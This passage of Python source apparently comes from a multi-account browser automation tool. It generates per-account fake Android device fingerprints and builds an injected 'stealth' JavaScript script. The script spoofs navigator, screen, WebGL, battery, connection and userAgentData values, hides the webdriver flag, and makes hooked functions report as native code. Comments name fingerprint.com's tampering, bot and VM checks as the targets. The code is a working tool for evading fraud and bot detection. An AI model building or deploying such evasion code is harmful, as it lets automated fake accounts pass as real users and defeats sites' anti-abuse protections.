    fp["batteryCharging"] = False  # mobile users rarely plugged in while browsing
    # Do Not Track — vary per account (most users leave it off)
    fp["doNotTrack"] = random.choice([None, None, None, "1", "unspecified"])
    # Network connection — stable values per account (not randomised per page)
    fp["connectionRtt"]      = random.randint(8, 35)          # WiFi RTT (5–35ms) not cellular (50–150ms)
    fp["connectionDownlink"] = round(random.uniform(25.0, 120.0), 1)  # Home broadband (25–120 Mbps) not cellular (7–15)
    # Browser history depth — simulates an account that has been used before
    fp["historyLength"] = random.randint(3, 14)
    # Unique WebGL noise per account (shifts float precision slightly)
    fp["webglNoise"] = round(random.uniform(0.000001, 0.000009), 8)
    # Per-account stable discharging time (seconds) — avoids Math.random() on every call
    fp["dischargingTime"] = random.randint(2400, 28800)   # 40 min – 8 hours
    try:
        with open(fp_path, "w") as f:
            json.dump(fp, f, indent=2)
    except Exception:
        pass
    if reuse_device_snapshot:
        _remember_shared_fingerprint(fp, device_index)
    return fp


def _remember_shared_fingerprint(fp: dict, device_index: int | None) -> None:
    """Publish this fingerprint so the next account, with Fresh off, matches it.

    Device Check writes the same file. Browser Check reads it back, so both
    surfaces use one device when the user did not ask for a fresh one.
    """
    if device_index is None:
        return
    try:
        payload = dict(fp)
        payload["deviceIndex"] = device_index
        tmp = DEVICE_FINGERPRINT_SNAPSHOT_PATH + ".browser.tmp"
        with open(tmp, "w") as handle:
            json.dump(payload, handle)
        os.replace(tmp, DEVICE_FINGERPRINT_SNAPSHOT_PATH)
    except Exception:
        pass


def _webgl_extensions(vendor: str, renderer: str) -> tuple[list[str], list[str]]:
    """Return (webgl1_exts, webgl2_exts) that match a real Android Chrome device.

    Key rule: real Android GPUs expose ASTC/ETC/ETC1 compression — NOT S3TC/DXT
    (which is desktop-only).  Headless Linux/ANGLE exposes the opposite set, so
    the extension list is one of the strongest headless-detection signals.
    """
    # ── Base set present on every modern Android Chrome GPU ──────────────────
    wgl1: list[str] = [
        "ANGLE_instanced_arrays", "EXT_blend_minmax", "EXT_color_buffer_half_float",
        # EXT_disjoint_timer_query intentionally EXCLUDED:
        # Chrome disabled it on Android (80+) due to Spectre. Its presence is a VM
        # signal — fingerprint.com uses it to run GPU timing tests and detect SwiftShader.
        "EXT_float_blend", "EXT_frag_depth",
        "EXT_shader_texture_lod", "EXT_texture_filter_anisotropic",
        "EXT_texture_norm16", "KHR_parallel_shader_compile",
        "OES_depth24", "OES_depth32", "OES_element_index_uint",
        "OES_fbo_render_mipmap", "OES_standard_derivatives",
        "OES_texture_float", "OES_texture_float_linear",
        "OES_texture_half_float", "OES_texture_half_float_linear",
        "OES_vertex_array_object", "WEBGL_color_buffer_float",
        "WEBGL_compressed_texture_astc",   # Android — NOT on Linux desktop
        "WEBGL_compressed_texture_etc",    # Android ETC2 — NOT on Linux desktop
        "WEBGL_compressed_texture_etc1",   # Android ETC1 — NOT on Linux desktop
        "WEBGL_debug_renderer_info",
        # WEBGL_debug_shaders intentionally EXCLUDED: debugging extension not
        # available in production Android Chrome — its presence flags a debug build / VM.
        "WEBGL_depth_texture", "WEBGL_draw_buffers",
        "WEBGL_lose_context", "WEBGL_multi_draw",
    ]
    wgl2: list[str] = [
        "EXT_color_buffer_float", "EXT_color_buffer_half_float",
        # EXT_disjoint_timer_query_webgl2 intentionally EXCLUDED (same reason as wgl1).
        "EXT_float_blend",
        "EXT_texture_filter_anisotropic", "EXT_texture_norm16",
        "KHR_parallel_shader_compile", "OES_draw_buffers_indexed",
        "OES_texture_float_linear", "WEBGL_compressed_texture_astc",
        "WEBGL_compressed_texture_etc", "WEBGL_debug_renderer_info",
        # WEBGL_debug_shaders intentionally EXCLUDED (same reason as wgl1).
        "WEBGL_lose_context", "WEBGL_multi_draw",
    ]
    # ── BPTC texture compression + OVR_multiview2 for newer GPU generations ──
    # Adreno 720+, Mali G610/G710/G715/G720/Immortalis, all Xclipse
    newer = False
    if vendor == "Qualcomm":
        newer = any(x in renderer for x in ("720", "730", "735", "740", "750", "830"))
    elif "Xclipse" in renderer or vendor in ("Samsung Electronics Co., Ltd.", "AMD"):
        newer = True
    else:  # ARM Mali / Immortalis
        newer = any(x in renderer for x in ("G610", "G710", "G715", "G720", "Immortalis"))

    if newer:
        # Insert BPTC after EXT_texture_filter_anisotropic (alphabetical position)
        i1 = wgl1.index("EXT_texture_norm16")
        wgl1.insert(i1, "EXT_texture_compression_bptc")
        i2 = wgl2.index("EXT_texture_norm16")
        wgl2.insert(i2, "EXT_texture_compression_bptc")
        wgl2.append("OVR_multiview2")

    return wgl1, wgl2


def _webgl_gl_version(vendor: str, renderer: str) -> str:
    """Return a realistic GL_VERSION string matched to the GPU vendor and renderer model.

    Each GPU family has its own driver version format:
      Qualcomm Adreno  → 'OpenGL ES 3.2 V@<driver> (GIT@<hash>, ...)'
      ARM Mali         → 'OpenGL ES 3.2 v1.r<N>p0-01eac0'
      Samsung Xclipse  → 'OpenGL ES 3.2'   (bare — real devices report this)
    """
    if vendor == "Qualcomm":
        # V@ driver numbers match the real Qualcomm OpenGL driver released with each SoC gen.
        if "830" in renderer:          # Snapdragon 8 Elite (SD 8s Gen 4)
            return "OpenGL ES 3.2 V@0720.0 (GIT@7f9f5d9, I8e3c47a6d5, 1be3571ebb, 1425f5b6da, 1)"
        if "750" in renderer:          # Snapdragon 8 Gen 3
            return "OpenGL ES 3.2 V@0615.0 (GIT@ae0c09c, I4b09e844d7, 1be3571ebb, 1425f5b6da, 1)"
        if "740" in renderer:          # Snapdragon 8 Gen 2
            return "OpenGL ES 3.2 V@0502.0 (GIT@c4a0898, I37649b2cee, 1be3571ebb, 1425f5b6da, 1)"
        if "730" in renderer or "735" in renderer:  # SD 8 Gen 1 / 7s Gen 2
            return "OpenGL ES 3.2 V@0490.0 (GIT@de90a5a, Ia5f5d518dc, 1be3571ebb, 1425f5b6da, 1)"
        if "720" in renderer:          # Snapdragon 7 Gen 3
            return "OpenGL ES 3.2 V@0502.0 (GIT@c4a0898, I37649b2cee, 1be3571ebb, 1425f5b6da, 1)"
        if "642" in renderer:          # Snapdragon 778G
            return "OpenGL ES 3.2 V@0490.0 (GIT@de90a5a, Ia5f5d518dc, 1be3571ebb, 1425f5b6da, 1)"
        return "OpenGL ES 3.2 V@0490.0 (GIT@de90a5a, Ia5f5d518dc, 1be3571ebb, 1425f5b6da, 1)"
    if "Xclipse" in renderer or vendor in ("Samsung Electronics Co., Ltd.", "AMD"):
        # Samsung Xclipse (RDNA-based) — real Galaxy S22/S23/S24/A55 devices return a bare string
        return "OpenGL ES 3.2"
    # ARM Mali / Immortalis — driver revision varies by architecture generation
    if "G78" in renderer or "G68" in renderer:
        return "OpenGL ES 3.2 v1.r40p0-01eac0"
    if "G710" in renderer or "G610" in renderer:
        return "OpenGL ES 3.2 v1.r44p0-01eac0"
    if "G77" in renderer:
        return "OpenGL ES 3.2 v1.r37p0-01eac0"
    if "G715" in renderer or "G720" in renderer or "Immortalis" in renderer:
        return "OpenGL ES 3.2 v1.r47p0-01eac0"
    return "OpenGL ES 3.2 v1.r44p0-01eac0"


def make_stealth_js(fp: dict) -> str:
    """Build the CDP stealth script with values from this account's fingerprint.
    Covers every modern fingerprinting surface: canvas, audio, WebGL, navigator,
    screen, connection, battery, timezone, UA-CH — all unique per account (app-cloner style)."""
    cs   = fp["canvasSeed"]
    an   = fp["audioNoise"]
    wv   = fp["webglVendor"].replace("'", "\\'")
    wr   = fp["webglRenderer"].replace("'", "\\'")
    gl_ver = _webgl_gl_version(fp["webglVendor"], fp["webglRenderer"]).replace("'", "\\'")
    import json as _json
    _wgl1, _wgl2 = _webgl_extensions(fp["webglVendor"], fp["webglRenderer"])
    wgl1_js = _json.dumps(_wgl1)
    wgl2_js = _json.dumps(_wgl2)
    if os.environ.get("FP_WEBGL_ONLY") == "1":
        # Device-check experiment: only the WebGL Proxy. The rest of this
        # script's JS lies are what raised Tampering 8 → 16 and Bot 7.
        return f"""
(function(){{
  var _wv='{wv}', _wr='{wr}', _e1={wgl1_js}, _e2={wgl2_js};
  function _answer(p, gp, ctx){{
    if(p===37445||p===7936)return _wv;
    if(p===37446||p===7937)return _wr;
    if(p===7938)return '{gl_ver}';
    if(p===35724)return 'OpenGL ES GLSL ES 3.20';
    if(p===3379||p===34024||p===34076)return 16384;
    if(p===36348)return 15;
    if(p===36349)return 224;
    if(p===36347)return 256;
    if(p===33901)return new Float32Array([1,511]);
    if(p===34930)return 8;
    try{{return gp.call(ctx,p);}}catch(e){{return null;}}
  }}
  function _hook(proto){{
    if(!proto||proto.__fpgc||typeof proto.getContext!=='function')return;
    var orig=proto.getContext;
    proto.getContext=function(type){{
      var ctx=orig.apply(this,arguments);
      try{{
        if(ctx&&type&&String(type).indexOf('webgl')!==-1){{
          var Ctor=(String(type).indexOf('2')!==-1&&window.WebGL2RenderingContext)?WebGL2RenderingContext:WebGLRenderingContext;
          var extList=Ctor===WebGL2RenderingContext?_e2:_e1;
          var nativeGP=Ctor.prototype.getParameter;
          var wrapped=function(p){{return _answer(p,nativeGP,ctx);}};
          Ctor.prototype.getParameter=function(p){{return _answer(p,nativeGP,this);}};
          var ge=ctx.getExtension.bind(ctx);
          return new Proxy(ctx,{{get:function(t,prop){{
            if(prop==='getParameter')return wrapped;
            if(prop==='getSupportedExtensions')return function(){{return extList.slice();}};
            if(prop==='getExtension')return function(name){{if(extList.indexOf(name)===-1)return null;return ge(name);}};
            var v=t[prop]; return typeof v==='function'?v.bind(t):v;
          }}}});
        }}
      }}catch(e){{}}
      return ctx;
    }};
    try{{Object.defineProperty(proto,'__fpgc',{{value:1}});}}catch(e){{}}
  }}
  _hook(HTMLCanvasElement.prototype);
  if(window.OffscreenCanvas)_hook(OffscreenCanvas.prototype);
}})();
"""
    cv   = fp["chromeVersion"]
    cv_major = cv.split(".")[0]   # e.g. "151" — used in UA-CH brands low-entropy array
    av   = fp["androidVersion"]
    mdl  = fp["model"].replace("'", "\\'")
    tz   = fp.get("timezone", "America/New_York").replace("'", "\\'")
    lg   = fp.get("language", "en-US").replace("'", "\\'")
    bat  = fp.get("batteryLevel", 0.72)
    bchg = "true" if fp.get("batteryCharging", False) else "false"
    dnt  = fp.get("doNotTrack")
    dnt_val = f"'{dnt}'" if dnt else "null"
    rtt  = fp.get("connectionRtt", 65)
    dl   = fp.get("connectionDownlink", 10.5)
    hist = fp.get("historyLength", 5)
    wn   = fp.get("webglNoise", 0.000002)
    dt   = fp.get("dischargingTime", 14400)
    # Stable media device IDs derived from canvas seed (no extra fingerprint fields)
    import hashlib as _hl
    _h = lambda s: _hl.sha256(s.encode()).hexdigest()
    _cs = str(fp["canvasSeed"])
    cam_rear_id  = _h(_cs + "cr")[:32]
    cam_front_id = _h(_cs + "cf")[:32]
    mic_id       = _h(_cs + "mc")[:32]
    cam_group    = _h(_cs + "cg")[:32]
    mic_group    = _h(_cs + "mg")[:32]
    # appVersion = UA minus "Mozilla/" prefix
    av_str = (
        f"5.0 (Linux; Android {fp['androidVersion']}; {fp['model']}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) "
        f"Chrome/{cv} Mobile Safari/537.36"
    )
    sw   = fp["screenW"]
    sh   = fp["screenH"]
    ah   = fp["availH"]
    lat  = fp.get("lat", 39.8283)
    lon  = fp.get("lon", -98.5795)
    # Compute real timezone offset in minutes (positive = west of UTC, e.g. EST=300)
    try:
        from zoneinfo import ZoneInfo as _ZI
        from datetime import datetime as _dt2
        _tz_offset = int(-_dt2.now(_ZI(fp.get("timezone", "America/New_York"))).utcoffset().total_seconds() / 60)
    except Exception:
        _tz_offset = 300   # CDT fallback
    return f"""
 (function(){{var _nts=Function.prototype.toString,_ntm=new WeakMap();function toString(){{return _ntm.has(this)?_ntm.get(this):_nts.call(this);}}Function.prototype.toString=toString;_ntm.set(Function.prototype.toString,'function toString() {{ [native code] }}');Object.defineProperty(window,'__nr',{{value:function(fn,n,g){{if(fn&&typeof fn==='function')_ntm.set(fn,'function '+(g?'get ':'')+n+'() {{ [native code] }}');}},configurable:true,enumerable:false,writable:false}});}})();
(function(){{
  // Override on Navigator.prototype, not the navigator instance.
  // fingerprint.com's tampering detector calls Object.getOwnPropertyDescriptor on
  // both the instance and the prototype; instance-level overrides are flagged.
  var _np=Object.getPrototypeOf(navigator);
  // Delete webdriver from prototype entirely — instance-level presence is the
  // single strongest tamper signal.
  try{{delete _np.webdriver;}}catch(e){{}}
  try{{
    Object.defineProperty(_np,'webdriver',{{get:function(){{return undefined;}},configurable:true,enumerable:false}});
    if(window.__nr){{var _wdd=Object.getOwnPropertyDescriptor(_np,'webdriver');if(_wdd&&_wdd.get)window.__nr(_wdd.get,'webdriver',true);}}
  }}catch(e){{}}
  // Helper: define on prototype with native-looking getter
  function _pd(k,v){{
    try{{
      Object.defineProperty(_np,k,{{get:function(){{return v;}},configurable:true,enumerable:true}});
      if(window.__nr){{var _d=Object.getOwnPropertyDescriptor(_np,k);if(_d&&_d.get)window.__nr(_d.get,k,true);}}
    }}catch(e){{}}
  }}
  _pd('hardwareConcurrency',{fp['hwConcurrency']});
  _pd('deviceMemory',{fp['deviceMemory']});
  // Do NOT delete maxTouchPoints / deviceMemory here. On Chrome 149 those
  // accessors are still non-configurable during the first injected script, so
  // delete succeeds and the redefine fails — leaving maxTouchPoints at 0.
  // The second script (make_plugins_override_js) applies them after C++ unlocks.
  _pd('cookieEnabled',true);
  _pd('doNotTrack',{dnt_val});
  _pd('maxTouchPoints',{fp['maxTouchPoints']});
  _pd('platform','{fp['platform']}');
  _pd('vendor','Google Inc.');
  _pd('appVersion','{av_str}');
  // Android Chrome: 0 plugins, 0 mimeTypes.
  // Verified fix: direct Navigator.prototype getter — confirmed working in Chrome 151 runtime probe.
  // Do NOT use window.navigator replacement or prototype chain walking.
  try{{Object.defineProperty(Navigator.prototype,'plugins',{{get:function(){{var fp={{length:0,item:function(){{return null;}},namedItem:function(){{return null;}},refresh:function(){{}}}};fp[Symbol.iterator]=function(){{return{{next:function(){{return{{done:true,value:undefined}};}}}};}};return fp;}},configurable:true,enumerable:true}});}}catch(e){{}}
  try{{Object.defineProperty(Navigator.prototype,'mimeTypes',{{get:function(){{var fm={{length:0,item:function(){{return null;}},namedItem:function(){{return null;}}}};fm[Symbol.iterator]=function(){{return{{next:function(){{return{{done:true,value:undefined}};}}}};}};return fm;}},configurable:true,enumerable:true}});}}catch(e){{}}
  try{{Object.defineProperty(_np,'languages',{{get:function(){{return['{lg}','en'];}},configurable:true}});}}catch(e){{}}
  try{{Object.defineProperty(_np,'language',{{get:function(){{return'{lg}';}},configurable:true}});}}catch(e){{}}
  try{{Object.defineProperty(_np,'globalPrivacyControl',{{get:function(){{return undefined;}},configurable:true}});}}catch(e){{}}
}})();
// userLanguage / browserLanguage / systemLanguage are IE-only properties.
// Real Android Chrome 138 does NOT have them. Their presence on navigator
// is a tampering signal fingerprint.com explicitly checks for — remove them.
(function(){{
  // Delete from prototype so Object.getOwnPropertyDescriptor(proto, key) === undefined,
  // matching real Android Chrome 138 where these IE-only properties don't exist at all.
  // Do NOT re-define them — any descriptor (even returning undefined) is a tamper signal.
  var _np2=Object.getPrototypeOf(navigator);
  ['userLanguage','browserLanguage','systemLanguage'].forEach(function(k){{
    try{{delete _np2[k];}}catch(e){{}}
    try{{delete navigator[k];}}catch(e){{}}
  }});
}})();
(function(){{
  // Tampering fix: screen.* must be overridden on Screen.prototype, NOT on the
  // screen instance. fingerprint.com calls Object.getOwnPropertyDescriptor(screen,'width')
  // — if that returns anything, it means the property was set on the instance (tampered).
  // On a real phone the descriptor lives on Screen.prototype, so instance lookup returns undefined.
  var _sp = Object.getPrototypeOf(screen);
  function _sd(k,v){{
    try{{
      Object.defineProperty(_sp,k,{{get:function(){{return v;}},configurable:true,enumerable:true}});
      if(window.__nr){{var _d=Object.getOwnPropertyDescriptor(_sp,k);if(_d&&_d.get)window.__nr(_d.get,k,true);}}
    }}catch(e){{}}
  }}
  _sd('width',{fp['screenW']});
  _sd('height',{fp['screenH']});
  _sd('availWidth',{fp['screenW']});
  _sd('availHeight',{fp['availH']});
  _sd('colorDepth',24);
  _sd('pixelDepth',24);
  _sd('availLeft',0);
  _sd('availTop',0);
  try{{_sd('isExtended',false);}}catch(e){{}}
}})();
(function(){{
  // Tampering fix: window dimension properties on Window.prototype, not instance.
  // CRITICAL: Object.getPrototypeOf(window) in Chrome 151's global-proxy context
  // returns the proxy itself, not Window.prototype — causing defineProperty to land
  // as a configurable own property on window (flagged by fingerprint.com as tampered).
  // Use Window.prototype directly: it is always correct and avoids the proxy trap.
  var _wp=Window.prototype;
  function _wd(k,v){{
    try{{
      Object.defineProperty(_wp,k,{{get:function(){{return v;}},configurable:true,enumerable:true}});
      if(window.__nr){{var _d=Object.getOwnPropertyDescriptor(_wp,k);if(_d&&_d.get)window.__nr(_d.get,k,true);}}
    }}catch(e){{}}
  }}
  _wd('devicePixelRatio',{fp['dpr']});
  _wd('innerWidth',{fp['screenW']});
  _wd('innerHeight',{fp['availH']});
  _wd('outerWidth',{fp['screenW']});
  _wd('outerHeight',{fp['screenH']});
  // Chrome 149 often keeps innerWidth as a non-configurable own accessor on the
  // window proxy, so the prototype override never wins. Mirror onto window itself
  // and visualViewport so outer/inner stay consistent (devtools heuristic).
  ['innerWidth','outerWidth'].forEach(function(k){{
    try{{Object.defineProperty(window,k,{{get:function(){{return {fp['screenW']};}},configurable:true}});}}catch(e){{}}
  }});
  try{{Object.defineProperty(window,'innerHeight',{{get:function(){{return {fp['availH']};}},configurable:true}});}}catch(e){{}}
  try{{Object.defineProperty(window,'outerHeight',{{get:function(){{return {fp['screenH']};}},configurable:true}});}}catch(e){{}}
  try{{
    if(window.visualViewport){{
      Object.defineProperty(window.visualViewport,'width',{{get:function(){{return {fp['screenW']};}},configurable:true}});
      Object.defineProperty(window.visualViewport,'height',{{get:function(){{return {fp['availH']};}},configurable:true}});
      Object.defineProperty(window.visualViewport,'scale',{{get:function(){{return 1;}},configurable:true}});
    }}
  }}catch(e){{}}
}})();
// maxTouchPoints, platform, vendor, appVersion now set on Navigator.prototype above
try{{Object.defineProperty(window.history,'length',{{get:()=>{hist},configurable:true}});}}catch(e){{}}
(function(){{
  var d={{brands:[{{brand:'Not(A;Brand',version:'8'}},{{brand:'Chromium',version:'{cv_major}'}},{{brand:'Google Chrome',version:'{cv_major}'}}],mobile:true,platform:'Android',
    getHighEntropyValues:function(h){{return Promise.resolve({{brands:this.brands,mobile:this.mobile,platform:this.platform,platformVersion:'{av}',architecture:'',bitness:'',model:'{mdl}',uaFullVersion:'{cv}',fullVersionList:[{{brand:'Not(A;Brand',version:'8.0.0.0'}},{{brand:'Chromium',version:'{cv}'}},{{brand:'Google Chrome',version:'{cv}'}}]}});}},
    toJSON:function(){{return{{brands:this.brands,mobile:this.mobile,platform:this.platform}};}}}};
  try{{Object.defineProperty(Navigator.prototype,'userAgentData',{{get:function(){{return d;}},configurable:true,enumerable:true}});if(window.__nr){{var _uadd=Object.getOwnPropertyDescriptor(Navigator.prototype,'userAgentData');if(_uadd&&_uadd.get)window.__nr(_uadd.get,'userAgentData',true);}}}}catch(e){{}}
}})();
(function(){{
  // Intercept Chrome's late window.chrome = {{app, runtime}} assignment (runs AFTER this script).
  // Direct delete/defineProperty on window.chrome.app fails when window.chrome is still undefined here.
  var _chromeRef=undefined;
  function _mockRuntime(){{
    return{{
      connect:function(){{throw new Error('Could not establish connection. Receiving end does not exist.');}},
      sendMessage:function(){{throw new Error('Could not establish connection. Receiving end does not exist.');}},
      onMessage:{{addListener:function(){{}},removeListener:function(){{}},hasListener:function(){{return false;}}}},
      onConnect:{{addListener:function(){{}},removeListener:function(){{}},hasListener:function(){{return false;}}}},
      id:undefined
    }};
  }}
  function _registerRuntimeNative(rt){{
    if(!window.__nr||!rt)return;
    window.__nr(rt.connect,'connect');
    window.__nr(rt.sendMessage,'sendMessage');
    if(rt.onMessage){{
      window.__nr(rt.onMessage.addListener,'addListener');
      window.__nr(rt.onMessage.removeListener,'removeListener');
      window.__nr(rt.onMessage.hasListener,'hasListener');
    }}
  }}
  function _sanitizeChrome(c){{
    if(!c||typeof c!=='object')return c;
    try{{delete c.app;}}catch(e){{}}
    try{{delete c.webstore;}}catch(e){{}}
    if(!c.runtime)c.runtime=_mockRuntime();
    else{{
      try{{Object.defineProperty(c.runtime,'id',{{get:function(){{return undefined;}},configurable:true}});}}catch(e){{}}
    }}
    _registerRuntimeNative(c.runtime);
    try{{Object.defineProperty(c,'app',{{get:function(){{return undefined;}},configurable:true,enumerable:false}});}}catch(e){{}}
    if(!c.loadTimes){{var _lt=Date.now()/1000;c.loadTimes=function(){{var _t=Date.now()/1000;return{{requestTime:_t-0.5,startLoadTime:_t-0.5,commitLoadTime:_t-0.3,finishDocumentLoadTime:_t-0.1,finishLoadTime:_t,firstPaintTime:_lt-0.25,firstPaintAfterLoadTime:_lt-0.18,navigationType:'Other',wasFetchedViaSpdy:false,wasNpnNegotiated:false,npnNegotiatedProtocol:'',wasAlternateProtocolAvailable:false,connectionInfo:''}}}};if(window.__nr)window.__nr(c.loadTimes,'loadTimes');}}
    if(!c.csi)c.csi=function(){{return{{startE:Date.now()-1000,onloadT:Date.now()-500,pageT:500,tran:15}}}};
    return c;
  }}
  try{{
    Object.defineProperty(window,'chrome',{{
      configurable:false,enumerable:true,
      get:function(){{return _chromeRef;}},
      set:function(v){{_chromeRef=_sanitizeChrome(v);}}
    }});
  }}catch(e){{}}
  // Seed Android-like chrome before the browser assigns its desktop object.
  try{{window.chrome=_sanitizeChrome({{}});}}catch(e){{}}
}})();
if(window.Notification){{Object.defineProperty(Notification,'permission',{{get:()=>'default'}});}}
try{{
  if(navigator.permissions&&navigator.permissions.query){{
    var _origPQ=navigator.permissions.query.bind(navigator.permissions);
    navigator.permissions.query=function(p){{
      if(p&&p.name==='notifications')return Promise.resolve({{state:Notification.permission,onchange:null}});
      return _origPQ(p);
    }};
    if(window.__nr)window.__nr(navigator.permissions.query,'query');
  }}
}}catch(e){{}}
try{{
  navigator.getBattery&&navigator.getBattery().then(function(b){{
    try{{Object.defineProperty(b,'charging',{{get:()=>{bchg}}});}}catch(e){{}}
    try{{Object.defineProperty(b,'level',{{get:()=>{bat}}});}}catch(e){{}}
    try{{Object.defineProperty(b,'chargingTime',{{get:()=>{bchg}?0:Infinity}});}}catch(e){{}}
    try{{Object.defineProperty(b,'dischargingTime',{{get:()=>{dt}}});}}catch(e){{}}
  }});
}}catch(e){{}}
window.ontouchstart=function(){{}};
try{{
  var _sOrient={{type:'portrait-primary',angle:0,onchange:null,
    lock:function(o){{return Promise.resolve();}},
    unlock:function(){{}},
    addEventListener:function(){{}},removeEventListener:function(){{}},dispatchEvent:function(){{return true;}}
  }};
  Object.defineProperty(screen,'orientation',{{get:function(){{return _sOrient;}},configurable:true}});
}}catch(e){{}}
try{{
  var conn={{'effectiveType':'4g','rtt':{rtt},'downlink':{dl},'downlinkMax':{dl},'saveData':false,'type':'wifi','onchange':null,
    addEventListener:function(){{}},removeEventListener:function(){{}},dispatchEvent:function(){{return true;}}
  }};
  // Define on Navigator.prototype — instance-level overrides are a strong tampering signal.
  var _cnp=Navigator.prototype;
  Object.defineProperty(_cnp,'connection',{{get:function(){{return conn;}},configurable:true,enumerable:true}});
  if(window.__nr){{var _cpd=Object.getOwnPropertyDescriptor(_cnp,'connection');if(_cpd&&_cpd.get)window.__nr(_cpd.get,'connection',true);}}
  Object.defineProperty(navigator,'mozConnection',{{get:()=>undefined}});
  Object.defineProperty(navigator,'webkitConnection',{{get:()=>undefined}});
}}catch(e){{}}
// keyboard: Android Chrome doesn't expose the Keyboard API.
// Delete from both prototype and instance (Chrome 149 may set it as own property).
try{{delete Navigator.prototype.keyboard;}}catch(e){{}}
try{{delete navigator.keyboard;}}catch(e){{}}
try{{Object.defineProperty(Navigator.prototype,'keyboard',{{get:function(){{return undefined;}},configurable:false,enumerable:false}});}}catch(e){{}}
// pdfViewerEnabled: exists on Navigator.prototype in Chrome 113+ — must be on prototype, not instance
try{{Object.defineProperty(Navigator.prototype,'pdfViewerEnabled',{{get:function(){{return true;}},configurable:true,enumerable:true}});}}catch(e){{}}
(function(){{
  var _ws={wn};
  function _phash(p){{var h=p^0xDEAD;h=((h>>16)^h)*0x45d9f3b|0;h=((h>>16)^h)*0x45d9f3b|0;return(h^(h>>16))&0xFFFF;}}
  var _wv='{wv}';var _wr='{wr}';
  var _e1={wgl1_js};
  var _e2={wgl2_js};
  function patch(ctx,extList){{
    var gp=ctx.prototype.getParameter;
    ctx.prototype.getParameter=function(p){{
      if(p===37445)return _wv;          // UNMASKED_VENDOR_WEBGL
      if(p===37446)return _wr;          // UNMASKED_RENDERER_WEBGL
      if(p===7936) return _wv;          // GL_VENDOR
      if(p===7937) return _wr;          // GL_RENDERER
      if(p===7938) return '{gl_ver}';   // GL_VERSION — vendor-matched
      if(p===35724)return 'OpenGL ES GLSL ES 3.20'; // SHADING_LANGUAGE_VERSION
      if(p===3379) return 16384;        // MAX_TEXTURE_SIZE (SwiftShader returns 8192 — wrong)
      if(p===34024)return 16384;        // MAX_RENDERBUFFER_SIZE
      if(p===34076)return 16384;        // MAX_CUBE_MAP_TEXTURE_SIZE
      if(p===36348)return 15;           // MAX_VARYING_VECTORS (SwiftShader:31, Mali:15)
      if(p===36349)return 224;          // MAX_FRAGMENT_UNIFORM_VECTORS (SwiftShader:254, Mali:224)
      if(p===36347)return 256;          // MAX_VERTEX_UNIFORM_VECTORS (SwiftShader:254, Mali:256)
      if(p===33901)return new Float32Array([1,511]); // ALIASED_POINT_SIZE_RANGE (desktop:[1,8191], mobile:[1,511])
      if(p===34930)return 8;            // STENCIL_BITS (SwiftShader:0, Mali:8)
      return gp.call(this,p);
    }};
    ctx.prototype.getSupportedExtensions=function(){{return extList.slice();}};
    var _origGE=ctx.prototype.getExtension;
    ctx.prototype.getExtension=function(name){{
      if(extList.indexOf(name)===-1)return null;
      return _origGE.call(this,name);
    }};
    // getShaderPrecisionFormat — SwiftShader returns wrong precision values vs real Mali GPU.
    // fingerprint.com reads vertex/fragment HIGH_FLOAT precision to detect VM rendering.
    // Mali-G78 MP20 (Pixel 6) reference values used here.
    var _origGSPF=ctx.prototype.getShaderPrecisionFormat;
    ctx.prototype.getShaderPrecisionFormat=function(st,pt){{
      var HF=36338,MF=36337,LF=36336,HI=36341,MI=36340,LI=36339;
      if(pt===HF)return{{rangeMin:127,rangeMax:127,precision:23}};
      if(pt===MF||pt===LF)return{{rangeMin:15,rangeMax:15,precision:10}};
      if(pt===HI)return{{rangeMin:31,rangeMax:30,precision:0}};
      if(pt===MI||pt===LI)return{{rangeMin:15,rangeMax:14,precision:0}};
      return _origGSPF?_origGSPF.call(this,st,pt):null;
    }};
    if(window.__nr){{window.__nr(ctx.prototype.getParameter,'getParameter');window.__nr(ctx.prototype.getSupportedExtensions,'getSupportedExtensions');window.__nr(ctx.prototype.getExtension,'getExtension');window.__nr(ctx.prototype.getShaderPrecisionFormat,'getShaderPrecisionFormat');}}
  }}
  function _answer(p, gp, ctx){{
    if(p===37445||p===7936)return _wv;
    if(p===37446||p===7937)return _wr;
    if(p===7938)return '{gl_ver}';
    if(p===35724)return 'OpenGL ES GLSL ES 3.20';
    if(p===3379||p===34024||p===34076)return 16384;
    if(p===36348)return 15;
    if(p===36349)return 224;
    if(p===36347)return 256;
    if(p===33901)return new Float32Array([1,511]);
    if(p===34930)return 8;
    try{{return gp.call(ctx,p);}}catch(e){{return null;}}
  }}
  // Chrome reinstalls the native getParameter when the context is created, so
  // a document-start prototype write is gone by the time fingerprint reads it.
  // Re-apply after getContext and also return a Proxy (instance property is
  // non-configurable, so a direct assignment never sticks).
  function _hookGetContext(ctorProto){{
    if(!ctorProto||ctorProto.__fpgc)return;
    var orig=ctorProto.getContext;
    if(typeof orig!=='function')return;
    ctorProto.getContext=function(type){{
      var ctx=orig.apply(this,arguments);
      try{{
        if(ctx&&type&&String(type).indexOf('webgl')!==-1){{
          var Ctor=/webgl2/i.test(String(type))?WebGL2RenderingContext:WebGLRenderingContext;
          var extList=(Ctor===WebGL2RenderingContext)?_e2:_e1;
          var gp=Ctor.prototype.getParameter;
          var nativeGP=gp;
          Ctor.prototype.getParameter=function(p){{return _answer(p,nativeGP,this);}};
          if(window.__nr)window.__nr(Ctor.prototype.getParameter,'getParameter');
          var ge=ctx.getExtension.bind(ctx);
          var gspf=ctx.getShaderPrecisionFormat&&ctx.getShaderPrecisionFormat.bind(ctx);
          var wrapped=function(p){{return _answer(p,nativeGP,ctx);}};
          if(window.__nr)window.__nr(wrapped,'getParameter');
          return new Proxy(ctx,{{
            get:function(t,prop){{
              if(prop==='getParameter')return wrapped;
              if(prop==='getSupportedExtensions')return function(){{return extList.slice();}};
              if(prop==='getExtension')return function(name){{
                if(extList.indexOf(name)===-1)return null;
                return ge(name);
              }};
              if(prop==='getShaderPrecisionFormat')return function(st,pt){{
                var HF=36338,MF=36337,LF=36336,HI=36341,MI=36340,LI=36339;
                if(pt===HF)return{{rangeMin:127,rangeMax:127,precision:23}};
                if(pt===MF||pt===LF)return{{rangeMin:15,rangeMax:15,precision:10}};
                if(pt===HI)return{{rangeMin:31,rangeMax:30,precision:0}};
                if(pt===MI||pt===LI)return{{rangeMin:15,rangeMax:14,precision:0}};
                return gspf?gspf(st,pt):null;
              }};
              var v=t[prop];
              return (typeof v==='function')?v.bind(t):v;
            }}
          }});
        }}
      }}catch(e){{}}
      return ctx;
    }};
    try{{Object.defineProperty(ctorProto,'__fpgc',{{value:1}});}}catch(e){{}}
    if(window.__nr)window.__nr(ctorProto.getContext,'getContext');
  }}
  _hookGetContext(HTMLCanvasElement.prototype);
